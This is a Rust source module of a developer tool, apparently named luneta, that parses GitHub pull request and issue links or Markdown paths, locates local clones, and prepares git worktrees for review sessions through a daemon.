use std::collections::HashMap;
use std::env;
use std::fmt;
use std::fs;
use std::io::{self, ErrorKind};
use std::num::NonZeroU32;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::Duration;

use tokio::time::timeout;
use tonic::{Code, Status};
use wt::cmd::add::{self, Fetch};
use wt::cmd::follow::Upstream;
use wt::repo::Repo;

use crate::api::paste_request::{self, File as AskedFile, Worked as AskedWorked};
use crate::api::paste_response;
use crate::api::{On, PasteRequest, PasteResponse};
use crate::client::Daemon;
use crate::git::{self, directory_gone, one_line, Common};
use crate::program::{self, Ran};
use crate::projects::{self, CloneRoot, Dir, Holders, Name, SPOT_LOOK};
use crate::{zoxide, Destination, Directory};

pub(crate) mod sync;

const GITHUB: &str = "github.com";

const MAKING: Duration = Duration::from_mins(3);

const ANSWER: Duration = Duration::from_secs(5);

const BARE_UNREAD: &str = "fatal: cannot use bare repository ";

const READ_BY_WORKTREES: &str = "luneta reads a bare repository only through its worktrees, as \
                                 a clone can hold one committed as plain files";

const ASKING: Duration = Duration::from_secs(30);

pub const PATIENCE: Duration = Duration::from_secs(3 * MAKING.as_secs() + ASKING.as_secs() + 60);

pub const WORKTREE_PATIENCE: Duration = Duration::from_secs(MAKING.as_secs() + 60);

const WORKED_MAX: usize = 1024;

const ORIGIN: &str = "origin";

pub const WHY: &str = "luneta: ";

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Link {
    owner: String,
    name: String,
    kind: Kind,
    number: NonZeroU32,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Kind {
    Pull,
    Issue,
}

impl Kind {
    const ALL: [Kind; 2] = [Kind::Pull, Kind::Issue];

    const fn path(self) -> &'static str {
        match self {
            Kind::Pull => "pull",
            Kind::Issue => "issues",
        }
    }
}

impl Link {
    #[must_use]
    pub fn parse(text: &str) -> Option<Link> {
        let rest = on_github(text)?;
        let path = rest.split(['?', '#']).next().unwrap_or_default();
        let mut parts = path.split('/');
        let (owner, name) = (parts.next()?, parts.next()?);
        let (page, number) = (parts.next()?, parts.next()?);
        let kind = Kind::ALL.into_iter().find(|kind| kind.path() == page)?;
        let digits = !number.is_empty() && number.bytes().all(|byte| byte.is_ascii_digit());
        if !named(owner) || !named(name) || !digits {
            return None;
        }
        let number = number.parse().ok()?;
        Some(Link { owner: owner.to_owned(), name: name.to_owned(), kind, number })
    }

    #[must_use]
    pub fn url(&self) -> String {
        let Link { owner, name, kind, number } = self;
        format!("https://{GITHUB}/{owner}/{name}/{}/{number}", kind.path())
    }

    #[must_use]
    pub fn kind(&self) -> Kind {
        self.kind
    }

    #[must_use]
    pub fn number(&self) -> NonZeroU32 {
        self.number
    }

    fn branch(&self) -> Option<String> {
        match self.kind {
            Kind::Pull => None,
            Kind::Issue => Some(format!("issue-{}", self.number)),
        }
    }

    fn wt(&self) -> Of {
        match self.branch() {
            Some(branch) => Of::Branch(Branch(branch)),
            None => Of::Pull(self.clone()),
        }
    }

    #[must_use]
    pub fn tab(&self) -> String {
        format!("#{}", self.number)
    }

    #[must_use]
    pub fn repository(&self) -> String {
        format!("{}/{}", self.owner, self.name)
    }

    #[must_use]
    pub fn is(&self, other: &Link) -> bool {
        self.number == other.number
            && self.owner.eq_ignore_ascii_case(&other.owner)
            && self.name.eq_ignore_ascii_case(&other.name)
    }

    fn of(&self, url: &str, ssh_host: impl FnOnce(&str) -> Option<String>) -> bool {
        url_is_of(url, (GITHUB, &self.owner, &self.name), ssh_host)
    }
}

pub(crate) fn remote_is_of(url: &str, repository: (&str, &str, &str)) -> bool {
    url_is_of(url, repository, ssh_host)
}

pub(crate) fn github_repository_of(
    url: &str,
    ssh_host: impl FnOnce(&str) -> Option<String>,
) -> Option<(&str, &str)> {
    let Spelled { host, ssh, owner, name } = spelled(url)?;
    let github = |host: &str| host.eq_ignore_ascii_case(GITHUB);
    let there = github(host) || (ssh && ssh_host(host).is_some_and(|host| github(&host)));
    there.then_some((owner, name))
}

fn url_is_of(
    url: &str,
    (on, owner, name): (&str, &str, &str),
    ssh_host: impl FnOnce(&str) -> Option<String>,
) -> bool {
    let Some(Spelled { host, ssh, owner: spelled_owner, name: spelled_name }) = spelled(url) else {
        return false;
    };
    let on = |host: &str| host.eq_ignore_ascii_case(on);
    spelled_owner.eq_ignore_ascii_case(owner)
        && spelled_name.eq_ignore_ascii_case(name)
        && (on(host) || (ssh && ssh_host(host).is_some_and(|host| on(&host))))
}

impl fmt::Display for Link {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}#{}", self.repository(), self.number)
    }
}

const MARKDOWN: &str = ".md";

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct File {
    path: String,
    from: Option<Directory>,
    stem: String,
}

impl File {
    #[must_use]
    pub fn parse(text: &str, from: Option<Directory>) -> Option<File> {
        let path = text.trim();
        let address = path.contains("://") || on_github(path).is_some();
        if address || path.chars().any(char::is_control) {
            return None;
        }
        let name = path.rsplit('/').next()?;
        let stem = slug(name.strip_suffix(MARKDOWN)?);
        (!stem.is_empty()).then(|| File { path: path.to_owned(), from, stem })
    }

    fn branch(&self) -> String {
        format!("md-{}", self.stem)
    }

    #[must_use]
    pub fn path(&self) -> &str {
        &self.path
    }

    fn real(&self) -> Result<String, String> {
        let real = fs::canonicalize(self.absolute()?).map_err(|error| match error.kind() {
            ErrorKind::NotFound => "no such file".to_owned(),
            _ => error.to_string(),
        })?;
        if !real.is_file() {
            return Err("it is no file".to_owned());
        }
        real.into_os_string().into_string().map_err(|_| "its real path is no text".to_owned())
    }

    fn absolute(&self) -> Result<PathBuf, String> {
        if let Some(rest) = self.path.strip_prefix("~/") {
            let home = env::var_os("HOME").map(PathBuf::from);
            let home = home.filter(|home| home.is_absolute());
            let home = home.ok_or("HOME is not set to an absolute path, for its ~/")?;
            return Ok(home.join(rest));
        }
        if self.path.starts_with('/') {
            return Ok(PathBuf::from(&self.path));
        }
        let from = self.from.as_ref().ok_or(
            "its path is relative, and the row highlighted works in no directory to go from",
        )?;
        Ok(Path::new(from.as_str()).join(&self.path))
    }

    fn repository(&self, real: &str) -> Result<String, String> {
        let beside = Path::new(real).parent().and_then(Path::to_str).unwrap_or(real);
        match git::common_within(beside, ANSWER) {
            Common::Of(_) => return Ok(beside.to_owned()),
            Common::Unsaid(why) => {
                return Err(format!("git did not say what repository it is in: {why}"));
            },
            Common::NoRepository => {},
        }
        let from = self.from.as_ref().ok_or(
            "it is in no repository, and the row highlighted works in no directory to go by",
        )?;
        match git::common_within(from.as_str(), ANSWER) {
            Common::Of(_) => Ok(from.to_string()),
            Common::NoRepository => {
                Err(format!("it is in no repository, nor is {from}, the row highlighted"))
            },
            Common::Unsaid(why) => Err(format!(
                "it is in no repository, and git did not say what {from}, the row highlighted, \
                 is in: {why}"
            )),
        }
    }
}

fn slug(stem: &str) -> String {
    let mut slug = String::with_capacity(stem.len());
    for c in stem.chars() {
        if c.is_alphanumeric() || c == '_' {
            slug.extend(c.to_lowercase());
        } else if !slug.is_empty() && !slug.ends_with('-') {
            slug.push('-');
        }
    }
    slug.truncate(slug.trim_end_matches('-').len());
    slug
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Work {
    Link(Link),
    File(File),
}

impl Work {
    #[must_use]
    pub fn parse(text: &str, from: Option<Directory>) -> Option<Work> {
        let link = Link::parse(text).map(Work::Link);
        link.or_else(|| File::parse(text, from).map(Work::File))
    }

    #[must_use]
    pub fn tab(&self) -> String {
        match self {
            Work::Link(link) => link.tab(),
            Work::File(file) => file.stem.clone(),
        }
    }

    fn branch(&self) -> Option<String> {
        match self {
            Work::Link(link) => link.branch(),
            Work::File(file) => Some(file.branch()),
        }
    }

    #[must_use]
    pub fn off_branch(&self, checked_out: Option<&str>) -> Option<String> {
        let own = self.branch()?;
        let on = checked_out.map_or("on no branch".to_owned(), |branch| format!("on {branch}"));
        Some(format!("{on}, not {own}"))
    }
}

impl fmt::Display for Work {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Work::Link(link) => link.fmt(f),
            Work::File(file) => f.write_str(&file.path),
        }
    }
}

fn on_github(text: &str) -> Option<&str> {
    let text = text.trim();
    let rest = text.strip_prefix("https://").or_else(|| text.strip_prefix("http://"));
    let rest = rest.unwrap_or(text);
    let rest = rest.strip_prefix("www.").unwrap_or(rest);
    rest.strip_prefix(GITHUB)?.strip_prefix('/')
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Branch(String);

impl Branch {
    pub fn parse(text: &str) -> Result<Branch, String> {
        let text = text.trim();
        if text.is_empty() {
            return Err("it names no branch".to_owned());
        }
        let numbered = text.rsplit_once('#').is_some_and(|(_, number)| {
            !number.is_empty() && number.bytes().all(|byte| byte.is_ascii_digit())
        });
        if numbered {
            return Err(format!("{text} names an issue or a pull request: paste its link"));
        }
        Ok(Branch(text.to_owned()))
    }

    #[must_use]
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl fmt::Display for Branch {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.0)
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Of {
    Pull(Link),
    Branch(Branch),
}

impl Of {
    pub fn parse(text: &str) -> Result<Of, String> {
        let Some(link) = Link::parse(text) else {
            if text.contains("://") || on_github(text).is_some() {
                return Err(format!("{} is no pull request's link on {GITHUB}", text.trim()));
            }
            return Branch::parse(text).map(Of::Branch);
        };
        match link.wt() {
            Of::Branch(branch) => {
                Err(format!("{link} is an issue: make the worktree of its branch, {branch}"))
            },
            pull @ Of::Pull(_) => Ok(pull),
        }
    }
}

impl fmt::Display for Of {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Of::Pull(link) => f.write_str(&link.url()),
            Of::Branch(branch) => f.write_str(branch.as_str()),
        }
    }
}

pub(crate) fn named(part: &str) -> bool {
    let allowed = |c: char| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.');
    !part.is_empty() && part.chars().all(allowed) && part.chars().any(|c| c != '.')
}

#[derive(Debug, PartialEq, Eq)]
struct Spelled<'a> {
    host: &'a str,
    ssh: bool,
    owner: &'a str,
    name: &'a str,
}

fn spelled(url: &str) -> Option<Spelled<'_>> {
    let (scheme, rest) = url.split_once("://").map_or((None, url), |(it, rest)| (Some(it), rest));
    let rest = match rest.split_once('@') {
        Some((user, host)) if !user.contains('/') => host,
        _ => rest,
    };
    let (host, path) = if scheme.is_some() {
        let (host, path) = rest.split_once('/')?;
        (host.split_once(':').map_or(host, |(host, _)| host), path)
    } else {
        rest.split_once(':').filter(|(host, _)| !host.contains('/'))?
    };
    let ssh = matches!(scheme, None | Some("ssh" | "git+ssh" | "ssh+git"));
    let path = path.trim_matches('/');
    let path = path.strip_suffix(".git").unwrap_or(path);
    let (owner, name) = path.split_once('/')?;
    (named(owner) && named(name)).then_some(Spelled { host, ssh, owner, name })
}

pub(crate) fn ssh_host(host: &str) -> Option<String> {
    let spelled = |c: char| c.is_ascii_alphanumeric() || matches!(c, '-' | '.' | '_');
    if host.is_empty() || host.starts_with('-') || !host.chars().all(spelled) {
        return None;
    }
    let mut ssh = Command::new("ssh");
    ssh.args(["-G", host]);
    let said = String::from_utf8(program::run(&mut ssh, ANSWER).ok()?.answer().ok()?).ok()?;
    said.lines().find_map(|line| line.strip_prefix("hostname ")).map(str::to_owned)
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
enum Remote {
    Origin,
    Other,
}

impl Remote {
    fn of(name: &str) -> Remote {
        if name == ORIGIN { Remote::Origin } else { Remote::Other }
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum Layout {
    Wt(Dir),
    WtRefused(String),
    BareElsewhere,
    InBare,
    Git,
    Unsaid,
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct Repository {
    by: Remote,
    layout: Layout,
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum Looked {
    Of(Repository, String),
    NotOf,
    Unsaid(String),
}

impl Looked {
    fn repository(&self) -> Option<&Repository> {
        match self {
            Looked::Of(repository, _) => Some(repository),
            Looked::NotOf | Looked::Unsaid(_) => None,
        }
    }

    fn remote(&self) -> Option<&str> {
        match self {
            Looked::Of(_, remote) => Some(remote),
            Looked::NotOf | Looked::Unsaid(_) => None,
        }
    }
}

fn repository(dir: &str, link: &Link, ssh_host: impl FnMut(&str) -> Option<String>) -> Looked {
    match remotes_in(dir) {
        Remotes::Listed(listed) => match remote(&listed, link, ssh_host) {
            Some(remote) => {
                Looked::Of(Repository { by: Remote::of(&remote), layout: layout(dir) }, remote)
            },
            None => Looked::NotOf,
        },
        Remotes::Unlisted => Looked::NotOf,
        Remotes::Unsaid(why) => Looked::Unsaid(why),
    }
}

fn remote(
    listed: &str,
    link: &Link,
    mut ssh_host: impl FnMut(&str) -> Option<String>,
) -> Option<String> {
    let of = |line: &str| {
        let (key, url) = line.split_once(' ')?;
        let name = key.strip_prefix("remote.")?.strip_suffix(".url")?;
        link.of(url.trim(), &mut ssh_host).then(|| name.to_owned())
    };
    listed.lines().filter_map(of).min_by_key(|name| Remote::of(name))
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Worked {
    pub dir: Directory,
    pub pull: Option<Link>,
    pub here: bool,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum At<P> {
    There(P),
    Unopened,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Ready<P> {
    pub at: At<P>,
    pub folder: Directory,
    pub branch: Option<String>,
    pub moved_off: bool,
    pub work: Readied,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Readied {
    Link(Link),
    File { real: String },
}

impl Ready<usize> {
    pub fn placed<P: Clone>(self, among: &[P]) -> Result<Ready<P>, usize> {
        let Ready { at, folder, branch, moved_off, work } = self;
        let view = |at: usize| among.get(at).cloned().ok_or(at);
        let at = match at {
            At::There(at) => At::There(view(at)?),
            At::Unopened => At::Unopened,
        };
        Ok(Ready { at, folder, branch, moved_off, work })
    }

    #[must_use]
    pub fn answer(self) -> PasteResponse {
        let Ready { at, folder, branch, moved_off, work } = self;
        let place = |at: usize| u32::try_from(at).expect("Pasted::of caps worked at 1024");
        let at = match at {
            At::There(at) => paste_response::At::There(place(at)),
            At::Unopened => paste_response::At::Unopened(()),
        };
        let file = match work {
            Readied::Link(_) => None,
            Readied::File { real } => Some(real),
        };
        let folder = folder.into();
        PasteResponse { at: Some(at), folder, branch, file, at_head: false, moved_off }
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Unready {
    Nowhere(String),
    Failed(String),
    InDoubt(String),
}

impl Unready {
    fn of(on: &Destination, status: &Status) -> Unready {
        let why = on.said(status);
        match status.code() {
            Code::NotFound => Unready::Nowhere(why),
            Code::FailedPrecondition | Code::InvalidArgument | Code::Unimplemented => {
                Unready::Failed(why)
            },
            _ => Unready::InDoubt(why),
        }
    }
}

impl From<String> for Unready {
    fn from(why: String) -> Self {
        Unready::Failed(why)
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Wanted {
    AsItIs,
    AtHead,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Pasted {
    work: Work,
    wanted: Wanted,
    worked: Vec<Worked>,
    reads_moved_off: bool,
}

impl Pasted {
    #[must_use]
    pub fn new(work: Work, worked: Vec<Worked>) -> Self {
        Pasted { work, wanted: Wanted::AsItIs, worked, reads_moved_off: true }
    }

    #[must_use]
    pub fn wanting(self, wanted: Wanted) -> Self {
        Pasted { wanted, ..self }
    }

    pub fn of(request: PasteRequest) -> Result<(Option<On>, Pasted), String> {
        let PasteRequest { on, work, worked, at_head, reads_moved_off } = request;
        let work = match work {
            Some(paste_request::Work::Link(link)) => {
                Work::Link(Link::parse(&link).ok_or_else(|| {
                    format!(
                        "link: {link:?} is no link of a pull request or of an issue on {GITHUB}"
                    )
                })?)
            },
            Some(paste_request::Work::File(AskedFile { path, from })) => {
                let from = from.map(Directory::parse).transpose();
                let from = from.map_err(|why| format!("from: {why}"))?;
                let file = File::parse(&path, from);
                Work::File(file.ok_or_else(|| format!("file: {path:?} is no path of a .md file"))?)
            },
            None => return Err("it says neither a link nor a file".to_owned()),
        };
        let wanted = if at_head { Wanted::AtHead } else { Wanted::AsItIs };
        if at_head && !matches!(&work, Work::Link(link) if link.kind() == Kind::Pull) {
            return Err("at_head: only a pull request has a head".to_owned());
        }
        if worked.len() > WORKED_MAX {
            return Err(format!("worked: more than {WORKED_MAX} views"));
        }
        let view = |AskedWorked { dir, pull, here }| {
            let dir = Directory::parse(dir).map_err(|why| format!("worked: {why}"))?;
            let pull = pull
                .map(|page| Link::parse(&page).ok_or(page))
                .transpose()
                .map_err(|page| format!("worked: {page:?} is no pull request's page"))?;
            Ok(Worked { dir, pull, here })
        };
        let worked = worked.into_iter().map(view).collect::<Result<_, String>>()?;
        Ok((on, Pasted { work, wanted, worked, reads_moved_off }))
    }

    #[must_use]
    pub fn asked(&self, on: Option<On>) -> PasteRequest {
        let view = |Worked { dir, pull, here }: &Worked| AskedWorked {
            dir: dir.clone().into(),
            pull: pull.as_ref().map(Link::url),
            here: *here,
        };
        let worked = self.worked.iter().map(view).collect();
        let work = match &self.work {
            Work::Link(link) => paste_request::Work::Link(link.url()),
            Work::File(File { path, from, .. }) => {
                let from = from.clone().map(String::from);
                paste_request::Work::File(AskedFile { path: path.clone(), from })
            },
        };
        let (at_head, reads_moved_off) = (self.wanted == Wanted::AtHead, self.reads_moved_off);
        PasteRequest { on, work: Some(work), worked, at_head, reads_moved_off }
    }

    pub fn ready(&self, holders: &Holders) -> Result<Ready<usize>, Unready> {
        let (worked, reads_moved_off) = (self.worked.as_slice(), self.reads_moved_off);
        match &self.work {
            Work::Link(link) => ready(link, self.wanted, reads_moved_off, worked, holders),
            Work::File(file) => ready_file(file, reads_moved_off, worked, holders),
        }
    }

    pub fn answer(&self, holders: &Holders) -> Result<PasteResponse, Unready> {
        let answer = self.ready(holders)?.answer();
        Ok(PasteResponse { at_head: self.wanted == Wanted::AtHead, ..answer })
    }

    pub async fn ready_on(
        &self,
        mut daemon: Daemon,
        on: &Destination,
        patience: Duration,
    ) -> Result<Ready<usize>, Unready> {
        let request = self.asked(Some(On { destination: on.to_string() }));
        let secs = patience.as_secs_f32();
        let minutes = PATIENCE.as_secs() / 60;
        let in_doubt = |why: String| Err(Unready::InDoubt(format!("{on}: {why}")));
        let mut answer = match timeout(patience, daemon.paste(request)).await {
            Ok(Ok(answer)) => answer.into_inner(),
            Ok(Err(status)) => return Err(Unready::of(on, &status)),
            Err(_) => return in_doubt(format!("lunetad did not answer in {secs}s")),
        };
        match timeout(PATIENCE + patience, answer.message()).await {
            Ok(Ok(Some(ready))) => self.answered(ready).or_else(in_doubt),
            Ok(Ok(None)) => in_doubt("lunetad's answer ended with nothing in it".to_owned()),
            Ok(Err(status)) => Err(Unready::of(on, &status)),
            Err(_) => in_doubt(format!("lunetad had found nothing after {minutes} minutes")),
        }
    }

    pub fn answered(&self, answer: PasteResponse) -> Result<Ready<usize>, String> {
        let PasteResponse { at, folder, branch, file, at_head, moved_off } = answer;
        if self.wanted == Wanted::AtHead && !at_head {
            return Err("started no review: its lunetad is too old to sync with the pull request"
                .to_owned());
        }
        let folder = Directory::parse(folder).map_err(|why| format!("folder: {why}"))?;
        let work = match (&self.work, file) {
            (Work::Link(link), None) => Readied::Link(link.clone()),
            (Work::Link(_), Some(file)) => return Err(format!("file: {file:?} is of no link")),
            (Work::File(_), Some(real)) if real.starts_with('/') => Readied::File { real },
            (Work::File(_), Some(real)) => {
                return Err(format!("file: {real:?} is no absolute path"));
            },
            (Work::File(_), None) => return Err("it does not say where the file is".to_owned()),
        };
        let at = match at {
            Some(paste_response::At::There(at)) => {
                let at = usize::try_from(at);
                At::There(at.map_err(|_| "there: it names a view luneta did not send".to_owned())?)
            },
            Some(paste_response::At::Unopened(())) => At::Unopened,
            None => {
                return Err("it says where the key goes in words this luneta cannot read, as a \
                            newer lunetad does"
                    .to_owned());
            },
        };
        Ok(Ready { at, folder, branch, moved_off, work })
    }
}

fn ready(
    link: &Link,
    wanted: Wanted,
    reads_moved_off: bool,
    worked: &[Worked],
    holders: &Holders,
) -> Result<Ready<usize>, Unready> {
    let mut seen: HashMap<String, Looked> = HashMap::new();
    let mut hosts: HashMap<String, Option<String>> = HashMap::new();
    let mut repository_of = |dir: &str| {
        let host_of =
            |host: &str| hosts.entry(host.to_owned()).or_insert_with(|| ssh_host(host)).clone();
        let looked = seen.entry(dir.to_owned()).or_insert_with(|| repository(dir, link, host_of));
        looked.repository().cloned()
    };
    let (repository, root) = match found(link, worked, &mut repository_of) {
        Some(Found::There(at)) => {
            kind_holds(link)?;
            let dir = &worked[at].dir;
            synced(dir.as_str(), link, wanted, None)?;
            let (folder, branch) = (dir.clone(), git::branch_within(dir.as_str(), ANSWER));
            let work = Readied::Link(link.clone());
            return Ok(Ready { at: At::There(at), folder, branch, moved_off: false, work });
        },
        Some(Found::InClone(at, root)) => (worked[at].dir.to_string(), root),
        None => match clone(link, &mut repository_of)? {
            Some(cloned) => cloned,
            None => return Err(no_clone(link, &seen)),
        },
    };
    lands(&root, holders)?;
    kind_holds(link)?;
    let work = Readied::Link(link.clone());
    let remote = seen.get(&repository).and_then(Looked::remote);
    if let Some(branch) = link.branch() {
        if reads_moved_off && let Some(moved) = moved_off(&repository, &root, &branch)? {
            return Ok(moved.ready(worked, work));
        }
        let remote = remote.ok_or_else(|| {
            format!("git does not say a remote of {repository} is {}", link.repository())
        })?;
        base(&repository, remote, &branch)?;
    }
    let ready = made_worktree(&repository, &link.wt(), worked, work)?;
    synced(ready.folder.as_str(), link, wanted, remote)?;
    Ok(ready)
}

fn synced(
    dir: &str,
    link: &Link,
    wanted: Wanted,
    remote: Option<&str>,
) -> Result<(), Unready> {
    match wanted {
        Wanted::AsItIs => Ok(()),
        Wanted::AtHead => sync::to_head(dir, link, remote)
            .map_err(|why| Unready::InDoubt(format!("started no review in {dir}: {why}"))),
    }
}

fn lands(root: &Dir, holders: &Holders) -> Result<(), String> {
    if let Some(held) = holders.plain.iter().find(|it| it.dir.below(root).is_some()) {
        return Err(format!("nothing made: {}", projects::held_by_folder(root, held)));
    }
    projects::subfolders(root, SPOT_LOOK).map_err(|why| format!("nothing made: {why}"))?;
    if holders.clones.contains(root) {
        return Ok(());
    }
    match Name::of_folder(root) {
        Ok(_) => Ok(()),
        Err(why) => Err(format!(
            "nothing made: no project holds {}, and one made for it cannot be named: {why}",
            root.as_str()
        )),
    }
}

fn kind_holds(link: &Link) -> Result<(), String> {
    if link.kind() == Kind::Issue {
        let page = page(link)?;
        if page.kind() == Kind::Pull {
            return Err(format!("it is a pull request on GitHub: paste {}", page.url()));
        }
    }
    Ok(())
}

fn ready_file(
    file: &File,
    reads_moved_off: bool,
    worked: &[Worked],
    holders: &Holders,
) -> Result<Ready<usize>, Unready> {
    let real = file.real()?;
    let repository = file.repository(&real)?;
    let root = wt_made(&repository)?;
    lands(&root, holders)?;
    let branch = file.branch();
    let work = Readied::File { real };
    if reads_moved_off && let Some(moved) = moved_off(&repository, &root, &branch)? {
        return Ok(moved.ready(worked, work));
    }
    base(&repository, ORIGIN, &branch)?;
    made_worktree(&repository, &Of::Branch(Branch(branch)), worked, work)
}

struct MovedOff {
    folder: Directory,
    on: Option<String>,
}

impl MovedOff {
    fn ready(self, worked: &[Worked], work: Readied) -> Ready<usize> {
        let MovedOff { folder, on: branch } = self;
        let at = opened_in(&folder, worked);
        Ready { at, folder, branch, moved_off: true, work }
    }
}

fn moved_off(dir: &str, root: &Dir, own: &str) -> Result<Option<MovedOff>, String> {
    let there = wt_makes(root, own);
    let mut git = Command::new("git");
    git::local(git.args(["-C", dir, "worktree", "list", "--porcelain"]));
    let ran = program::run(&mut git, ANSWER)
        .map_err(|error| format!("git worktree list could not be run: {error}"))?;
    let listed = ran.answer().map_err(|why| format!("git worktree list: {why}"))?;
    let listed = String::from_utf8_lossy(&listed);
    let Some(entry) = sits_off(&listed, &there, own) else {
        return Ok(None);
    };
    let on = entry.lines().find_map(|line| line.strip_prefix("branch refs/heads/"));
    Ok(directory(&there).map(|folder| MovedOff { folder, on: on.map(str::to_owned) }))
}

fn wt_makes(root: &Dir, branch: &str) -> String {
    format!("{}/{branch}", root.as_str())
}

fn sits_off<'a>(listed: &'a str, there: &str, own: &str) -> Option<&'a str> {
    let head = format!("branch refs/heads/{own}");
    if listed.lines().any(|line| line == head) {
        return None;
    }
    let first = format!("worktree {there}");
    listed
        .split("\n\n")
        .find(|entry| entry.lines().next() == Some(first.as_str()))
        .filter(|entry| !entry.lines().any(|line| line.starts_with("prunable")))
}

fn made_worktree(
    dir: &str,
    of: &Of,
    worked: &[Worked],
    work: Readied,
) -> Result<Ready<usize>, Unready> {
    let folder = worktree(dir, of)?;
    let at = opened_in(&folder, worked);
    let branch = git::branch_within(folder.as_str(), ANSWER);
    Ok(Ready { at, branch, moved_off: false, folder, work })
}

fn opened_in(folder: &Directory, worked: &[Worked]) -> At<usize> {
    let in_it = worked.iter().enumerate().filter(|(_, it)| it.dir == *folder);
    match in_it.min_by_key(|(at, it)| (!it.here, *at)) {
        Some((at, _)) => At::There(at),
        None => At::Unopened,
    }
}

#[derive(Debug, PartialEq, Eq)]
enum Found {
    There(usize),
    InClone(usize, Dir),
}

fn found(
    link: &Link,
    worked: &[Worked],
    mut repository_of: impl FnMut(&str) -> Option<Repository>,
) -> Option<Found> {
    let checked_out = |(_, it): &(usize, &Worked)| it.pull.as_ref().is_some_and(|it| it.is(link));
    let there = worked.iter().enumerate().filter(checked_out);
    let there = there.min_by_key(|(at, it)| (!it.here, *at));
    if let Some((at, _)) = there {
        return Some(Found::There(at));
    }
    let in_clone = worked.iter().enumerate().filter_map(|(at, it)| {
        let Repository { by, layout: Layout::Wt(root) } = repository_of(it.dir.as_str())? else {
            return None;
        };
        Some((!it.here, by, at, root))
    });
    let first = in_clone.min_by_key(|(away, by, at, _)| (*away, *by, *at));
    first.map(|(_, _, at, root)| Found::InClone(at, root))
}

fn clone(
    link: &Link,
    repository_of: impl FnMut(&str) -> Option<Repository>,
) -> Result<Option<(String, Dir)>, String> {
    let repository = link.repository();
    let dirs: Vec<String> = zoxide::visited()
        .map_err(|why| {
            format!("no session works in {repository}, and luneta cannot look for a clone: {why}")
        })?
        .into_iter()
        .map(|dir| dir.path.into())
        .collect();
    Ok(cloned(&dirs, repository_of).map(|(at, root)| (dirs[at].clone(), root)))
}

fn no_clone(link: &Link, seen: &HashMap<String, Looked>) -> Unready {
    let repository = link.repository();
    let laid_out = |layout: Layout| {
        let of_it = move |(_, it): &(&String, &Looked)| {
            it.repository().is_some_and(|it| it.layout == layout)
        };
        seen.iter().filter(of_it).map(|(dir, _)| dir).min()
    };
    let unsaid = |(dir, it): (&'_ String, &'_ Looked)| match it {
        Looked::Unsaid(why) => Some((dir.clone(), why.clone())),
        Looked::Of(..) | Looked::NotOf => None,
    };
    let refused = |(dir, it): (&'_ String, &'_ Looked)| match &it.repository()?.layout {
        Layout::WtRefused(why) => Some((dir.clone(), why.clone())),
        Layout::Wt(_) | Layout::BareElsewhere | Layout::InBare | Layout::Git | Layout::Unsaid => {
            None
        },
    };
    if let Some(dir) = laid_out(Layout::Git) {
        return Unready::Failed(format!(
            "{dir} is in a clone of {repository} that git made, and wt would make the worktree \
             in its .git; wt clone it first"
        ));
    }
    if let Some(dir) = laid_out(Layout::BareElsewhere) {
        return Unready::Failed(format!(
            "{dir} is in a bare clone of {repository} that is not a .bare, and wt would make \
             the worktree inside it; wt clone it first"
        ));
    }
    if let Some((dir, why)) = seen.iter().filter_map(refused).min() {
        return Unready::Failed(format!(
            "{dir} is in a clone of {repository} that wt made in a folder luneta cannot keep: \
             {why}"
        ));
    }
    if let Some(dir) = laid_out(Layout::InBare) {
        return Unready::Failed(format!(
            "{dir} is in a bare repository of {repository}, not in a worktree of it; \
             {READ_BY_WORKTREES}"
        ));
    }
    if let Some(dir) = laid_out(Layout::Unsaid) {
        return Unready::Failed(format!(
            "git did not say whether {dir}, of {repository}, is in a clone wt made"
        ));
    }
    match seen.iter().filter_map(unsaid).min() {
        Some((dir, why)) => {
            Unready::Failed(format!("git did not say whether {dir} is of {repository}: {why}"))
        },
        None => Unready::Nowhere(format!(
            "no session works in {repository}, nor does zoxide know a clone of it; wt clone it \
             first"
        )),
    }
}

fn cloned(
    dirs: &[String],
    mut repository_of: impl FnMut(&str) -> Option<Repository>,
) -> Option<(usize, Dir)> {
    let mut best: Option<(Remote, usize, Dir)> = None;
    for (at, dir) in dirs.iter().enumerate() {
        if let Some(Repository { by, layout: Layout::Wt(root) }) = repository_of(dir) {
            if best.as_ref().is_none_or(|(was, _, _)| by < *was) {
                best = Some((by, at, root));
            }
            if by == Remote::Origin {
                break;
            }
        }
    }
    best.map(|(_, at, root)| (at, root))
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) enum Remotes {
    Listed(String),
    Unlisted,
    Unsaid(String),
}

impl Remotes {
    fn of(ran: io::Result<Ran>) -> Remotes {
        let ran = match ran {
            Ok(ran) => ran,
            Err(error) => return Remotes::Unsaid(format!("it could not be run: {error}")),
        };
        if let Ran::Ended { status, stderr, .. } = &ran
            && ((status.code() == Some(1) && stderr.is_empty()) || directory_gone(stderr))
        {
            return Remotes::Unlisted;
        }
        match ran.answer().map(String::from_utf8) {
            Ok(Ok(listed)) => Remotes::Listed(listed),
            Ok(Err(_)) => Remotes::Unsaid("it listed what is no text".to_owned()),
            Err(why) => Remotes::Unsaid(why),
        }
    }
}

